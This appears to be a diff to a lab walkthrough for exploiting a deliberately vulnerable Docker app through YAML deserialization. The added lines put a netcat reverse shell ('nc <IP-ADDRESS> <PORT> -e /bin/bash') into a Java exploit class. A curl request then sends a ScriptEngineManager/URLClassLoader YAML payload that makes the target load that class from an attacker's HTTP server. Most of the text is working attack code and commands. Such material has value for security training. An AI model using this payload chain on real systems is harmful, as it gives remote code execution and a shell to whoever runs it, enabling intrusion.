@@ -25,9 +25,13 @@ Start the Docker container using the following command:
 docker run -d -p 8080:8080 --name vulnerable-container vulnerable-app
 
 4. Edit and compile ExploitScriptEngineFactory.java
+Runtime.getRuntime().exec("nc <IP-ADDRESS> <PORT> -e /bin/bash");
+Replace IP-ADDRESS with your attacker machine and PORT with listener port noted in step 6.
+
+Compile:
 javac ExploitScriptEngineFactory.java
 
-Then place the class file inside the folder (e.g exploit/ExploitScriptEngineFactory.class)
+Then place the compiled class file inside the folder (e.g exploit/ExploitScriptEngineFactory.class)
 
 5. Start an HTTP server
 
@@ -46,7 +50,7 @@ Use a tool like Burp Suite or curl to send a malicious payload to the vulnerable
 
 curl -X POST -H "Content-Type: application/x-yaml" \
      -d '!!javax.script.ScriptEngineManager [
-          !!java.net.URLClassLoader [[!!java.net.URL ["http://<your-server-ip>:8000/"]]]
+          !!java.net.URLClassLoader [[!!java.net.URL ["http://<your-web-server-ip>:8000/"]]]
         ]' \
      http://localhost:8080/endpoint
 
